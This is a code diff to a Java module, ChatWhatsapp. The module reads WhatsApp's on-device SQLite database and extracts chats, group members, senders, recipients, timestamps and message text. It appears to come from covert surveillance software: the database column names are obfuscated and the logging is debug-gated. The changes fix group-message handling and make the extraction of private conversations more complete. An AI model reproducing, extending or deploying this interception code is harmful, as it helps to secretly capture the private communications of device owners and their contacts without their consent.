@@ -40,7 +40,7 @@ public class ChatWhatsapp extends SubModuleChat {
 	ChatGroups groups = new ChatWhatsappGroups();
 
 	Hashtable<String, Integer> hastableConversationLastIndex = new Hashtable<String, Integer>();
-	private static final int PROGRAM_WHATSAPP = 0x06;
+	private static final int PROGRAM = 0x06;
 
 	private static final String DEFAULT_LOCAL_NUMBER = "local";
 	String pObserving = "whatsapp";
@@ -50,7 +50,7 @@ public class ChatWhatsapp extends SubModuleChat {
 
 	@Override
 	int getProgramId() {
-		return PROGRAM_WHATSAPP;
+		return PROGRAM;
 	}
 
 	@Override
@@ -235,7 +235,7 @@ public class ChatWhatsapp extends SubModuleChat {
 					String conversation = pair.first;
 					int lastReadIndex = pair.second;
 
-					if (groups.isGroup(conversation) && groups.hasMemoizedGroup(conversation)) {
+					if (groups.isGroup(conversation) && !groups.hasMemoizedGroup(conversation)) {
 						fetchGroup(db, conversation);
 					}
 
@@ -273,6 +273,10 @@ public class ChatWhatsapp extends SubModuleChat {
 
 	private void fetchGroup(SQLiteDatabase db, final String conversation) {
 
+		if (Cfg.DEBUG) {
+			Check.log(TAG + " (fetchGroup) : " + conversation);
+		}
+
 		// f.4=_id
 		// f.5=key_remote_jid
 		// f_f=remote_resources
@@ -280,7 +284,7 @@ public class ChatWhatsapp extends SubModuleChat {
 		String selection = Messages.getString("f_5") + "='" + conversation + "'";
 
 		// final Set<String> remotes = new HashSet<String>();
-
+		groups.addPeerToGroup(conversation, clean(myPhoneNumber));
 		RecordVisitor visitor = new RecordVisitor(projection, selection) {
 
 			@Override
@@ -405,7 +409,9 @@ public class ChatWhatsapp extends SubModuleChat {
 			int index = cursor.getInt(0); // f_4
 			String message = cursor.getString(2); // f_7
 			Long timestamp = cursor.getLong(3); // f_b
+			
 			boolean incoming = cursor.getInt(4) != 1; // f_c
+			
 			String remote = clean(cursor.getString(5));
 
 			if (Cfg.DEBUG) {
@@ -414,27 +420,39 @@ public class ChatWhatsapp extends SubModuleChat {
 			lastRead = Math.max(index, lastRead);
 
 			if (StringUtils.isEmpty(message)) {
-				if (groups.isGroup(conversation) && !StringUtils.isEmpty(remote)) {
-					if (Cfg.DEBUG) {
-
-					}
-				}
-			} else {
-
 				if (Cfg.DEBUG) {
-					Check.log(TAG + " (fetchMessages): " + StringUtils.byteArrayToHexString(message.getBytes()));
+					Check.log(TAG + " (fetchMessages), empty message");
 				}
-				String from = incoming ? peer : myPhoneNumber;
-				String to = incoming ? myPhoneNumber : peer;
+				continue;
 
-				if (groups.isGroup(peer)) {
-					if (incoming) {
-						from = remote;
-					} else {
-						to = groups.getGroupTo(from, peer);
-					}
+			}
+
+			if (Cfg.DEBUG) {
+				//Check.log(TAG + " (fetchMessages): " + StringUtils.byteArrayToHexString(message.getBytes()));
+			}
+
+			String from = incoming ? peer : myPhoneNumber;
+			String to = incoming ? myPhoneNumber : peer;
+
+			//if (groups.isGroup(peer)) {
+			//	to = groups.getGroupTo(from, peer);
+			//}
+			
+			if (groups.isGroup(peer)) {
+				if (incoming) {
+					from = remote;
+				} else {
+					//to = groups.getGroupTo(from, peer);
 				}
-				messages.add(new MessageChat(PROGRAM_WHATSAPP, new Date(timestamp), from, to, message, incoming));
+				to = groups.getGroupTo(from, peer);
+			}
+
+			if (to != null && from != null && message != null) {
+				messages.add(new MessageChat(PROGRAM, new Date(timestamp), from, to, message, incoming));
+			} else {
+				if (Cfg.DEBUG) {
+					Check.log(TAG + " (fetchMessages) Error, null values");
+				}
 			}
 
 		}
